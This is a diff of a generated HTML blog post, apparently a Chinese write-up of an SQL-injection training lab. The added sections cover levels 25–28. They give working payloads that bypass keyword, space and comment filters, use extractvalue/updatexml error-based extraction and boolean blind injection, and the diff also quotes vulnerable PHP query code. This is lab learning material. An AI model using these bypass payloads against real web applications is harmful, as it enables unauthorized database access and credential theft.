@@ -81,8 +81,12 @@
 <meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230717215500916.png">
 <meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230717215554491.png">
 <meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230717215729390.png">
+<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230718004643507.png">
+<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230718004823424.png">
+<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230718004737058.png">
+<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230718005009949.png">
 <meta property="article:published_time" content="2023-02-09T08:30:35.000Z">
-<meta property="article:modified_time" content="2023-07-17T14:11:53.709Z">
+<meta property="article:modified_time" content="2023-07-17T21:41:44.379Z">
 <meta property="article:author" content="Potat0w0">
 <meta property="article:tag" content="Web">
 <meta property="article:tag" content="sqli">
@@ -299,7 +303,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          27k words
+          28k words
         
       </span>
     
@@ -310,7 +314,7 @@
         
         
         
-          223 mins
+          231 mins
         
       </span>
     
@@ -634,19 +638,16 @@
 <p><img src="/2023/02/09/SQLI/image-20230717134452778.png" srcset="/img/loading.gif" lazyload></p>
 <p>level19和level18差不多，只是注入点从uagent变成了referer</p>
 <p><img src="/2023/02/09/SQLI/image-20230717140539335.png" srcset="/img/loading.gif" lazyload></p>
-<p>level20:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$result</span>)<br>			&#123;<br>			<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Issue with your mysql: &#x27;</span> . <span class="hljs-title function_ invoke__">mysql_error</span>());<br>			&#125;<br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>)<br>	&#123;<br>  	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&#x27;</span>;	<br>  	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Login name:&#x27;</span>. <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>  	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&#x27;</span>;  	<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Password:&#x27;</span> .<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>  	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&lt;/b&gt;&quot;</span>;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your ID:&#x27;</span> .<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>  	&#125;<br></code></pre></td></tr></table></figure>
+<h4 id="level20"><a href="#level20" class="headerlink" title="level20:"></a>level20:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$result</span>)<br>			&#123;<br>			<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Issue with your mysql: &#x27;</span> . <span class="hljs-title function_ invoke__">mysql_error</span>());<br>			&#125;<br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>)<br>	&#123;<br>  	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&#x27;</span>;	<br>  	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Login name:&#x27;</span>. <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>  	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&#x27;</span>;  	<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Password:&#x27;</span> .<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>  	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&lt;/b&gt;&quot;</span>;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your ID:&#x27;</span> .<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>  	&#125;<br></code></pre></td></tr></table></figure>
 
 <p>单引号闭合username&#x3D;cookie，因此只需要对cookie进行闭合后注入恶意语句即可</p>
 <p><img src="/2023/02/09/SQLI/image-20230717144828460.png" srcset="/img/loading.gif" lazyload></p>
-<p>level21:</p>
-<p>和上一题基本没差，就是在cookie上多了个base64编码过程，然后查询语句闭合方式变为<code>&#39;)</code></p>
+<h4 id="level21"><a href="#level21" class="headerlink" title="level21:"></a>level21:</h4><p>和上一题基本没差，就是在cookie上多了个base64编码过程，然后查询语句闭合方式变为<code>&#39;)</code></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$cookee</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$cookee</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;/font&gt;&quot;</span>;<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="hljs-subst">$cookee</span>&#x27;) LIMIT 0,1&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$result</span>)<br>			&#123;<br>			<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Issue with your mysql: &#x27;</span> . <span class="hljs-title function_ invoke__">mysql_error</span>());<br>			&#125;<br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>)<br>	&#123;<br>  	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&#x27;</span>;	<br>  	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Login name:&#x27;</span>. <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>  	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&#x27;</span>;  	<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Password:&#x27;</span> .<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>  	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&lt;/b&gt;&quot;</span>;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your ID:&#x27;</span> .<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>  	&#125;<br></code></pre></td></tr></table></figure>
 
 <p><img src="/2023/02/09/SQLI/image-20230717150449907.png" srcset="/img/loading.gif" lazyload></p>
 <p><img src="/2023/02/09/SQLI/image-20230717150514301.png" srcset="/img/loading.gif" lazyload></p>
-<p>level22：</p>
-<p>同上题，改成双引号闭合罢了</p>
+<h4 id="level22："><a href="#level22：" class="headerlink" title="level22："></a>level22：</h4><p>同上题，改成双引号闭合罢了</p>
 <p>level23：</p>
 <p>单引号输进去报错，但是加注释报错仍然存在，看了眼源代码，注释被过滤掉了</p>
 <p><img src="/2023/02/09/SQLI/image-20230717154027281.png" srcset="/img/loading.gif" lazyload></p>
@@ -659,8 +660,7 @@
 <p><img src="/2023/02/09/SQLI/image-20230717154544881.png" srcset="/img/loading.gif" lazyload></p>
 <p>这里是报错注入所以就不用太在意and、or逻辑关系</p>
 <p>(前面报错注入做太爽了后面才注意到可以直接联合注入，无所谓，报错注入真好用)</p>
-<p>level24</p>
-<p>目前最牛的一级</p>
+<h4 id="level24"><a href="#level24" class="headerlink" title="level24"></a>level24</h4><p>目前最牛的一级</p>
 <p>代码审计</p>
 <p>源代码大致有主页、修改密码、注册新用户页面。看到存在<code>mysql_escape_string()</code>过滤函数存在，开始搜寻不存在过滤的变量</p>
 <p>诶嘿，这不是就传入了个SESSION没有过滤吗</p>
@@ -680,6 +680,33 @@
 <p>修改其密码为114514，根据sql语句分析，此时应该修改了<code>admin</code>用户的密码<img src="/2023/02/09/SQLI/image-20230717215554491.png" srcset="/img/loading.gif" lazyload></p>
 <p>成功登录admin</p>
 <p><img src="/2023/02/09/SQLI/image-20230717215729390.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="level25"><a href="#level25" class="headerlink" title="level25"></a>level25</h4><p>一个简单的双写过滤，payload：</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?id=<span class="hljs-number">1</span>&#x27; anandd extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> database())))<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="level26"><a href="#level26" class="headerlink" title="level26"></a>level26</h4><p>空格过滤，or and过滤，注释符过滤</p>
+<p>注释符过滤前面提到可以通过闭合后引号解决，空格过滤在此之前只接触过&#x2F;**&#x2F;，才疏学浅，结果发现&#x2F;**&#x2F;也被过滤了（呜呜呜呜</p>
+<p>去找了找网上的资料，如果空格被过滤了可以用如下字符替代：</p>
+<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">a0</span></span>：非断行空格<br><span class="hljs-tag">%<span class="hljs-selector-tag">0a</span></span>：新建一行<br><span class="hljs-tag">%<span class="hljs-selector-tag">0b</span></span>：Tab(垂直)<br><span class="hljs-tag">%<span class="hljs-selector-tag">0c</span></span>：新的一页<br><span class="hljs-tag">%<span class="hljs-selector-tag">0d</span></span>：return<br><span class="hljs-tag">%<span class="hljs-selector-tag">09</span></span>：Tab(水平)<br></code></pre></td></tr></table></figure>
+
+<p>这里%a0和%0b可行，payload：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&#x27;<span class="hljs-variable">%a0anandd</span><span class="hljs-variable">%a0extractvalue</span>(<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>concat(<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>(<span class="hljs-keyword">select</span><span class="hljs-variable">%a0database</span>())))<span class="hljs-variable">%a0oorr</span>&#x27;<span class="hljs-number">1</span>&#x27;<span class="hljs-operator">=</span>&#x27;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p>在网上看到一种神奇的写法，记个笔记：</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">?id=<span class="hljs-number">1&#x27;</span>||(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(table_name))<span class="hljs-keyword">from</span>(infoorrmation_schema.tables)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-string">&#x27;security&#x27;</span>))),<span class="hljs-number">1</span>))||<span class="hljs-string">&#x27;0 </span><br></code></pre></td></tr></table></figure>
+
+<h4 id="level27"><a href="#level27" class="headerlink" title="level27"></a>level27</h4><p>payload：</p>
+<p>依旧对空格过滤，但是这回上面提到的几个都行，select存在过滤，selEct大写绕过</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&#x27;<span class="hljs-variable">%0</span>aand<span class="hljs-variable">%0</span>aupdatexml(<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>(concat(<span class="hljs-number">1</span><span class="hljs-punctuation">,</span>(selEct<span class="hljs-variable">%0</span>adatabase())))<span class="hljs-punctuation">,</span><span class="hljs-number">1</span>)<span class="hljs-variable">%0</span>aand<span class="hljs-variable">%0</span>a&#x27;<br></code></pre></td></tr></table></figure>
+
+<h4 id="level28"><a href="#level28" class="headerlink" title="level28"></a>level28</h4><p>没有报错信息，报错注入行不通了，试下盲注，空格依旧使用%0a过滤，payload：</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-built_in">?id</span>=<span class="hljs-number">1</span><span class="hljs-meta">%27</span><span class="hljs-meta">%0aand</span><span class="hljs-meta">%0alength</span>(database())=<span class="hljs-number">8</span><span class="hljs-meta">%0aor</span><span class="hljs-meta">%0a</span><span class="hljs-meta">%271</span><span class="hljs-meta">%27</span>=<span class="hljs-meta">%272</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/02/09/SQLI/image-20230718004643507.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230718004823424.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里就要注意or和and之间的逻辑关系了，上面两种是正确的注入逻辑，下面两种是错误的注入逻辑</p>
+<p><img src="/2023/02/09/SQLI/image-20230718004737058.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230718005009949.png" srcset="/img/loading.gif" lazyload></p>
+<p>时间盲注也行，但是可以用布尔盲注为什么要用时间盲注呢（笑</p>
 
                 
               </div>
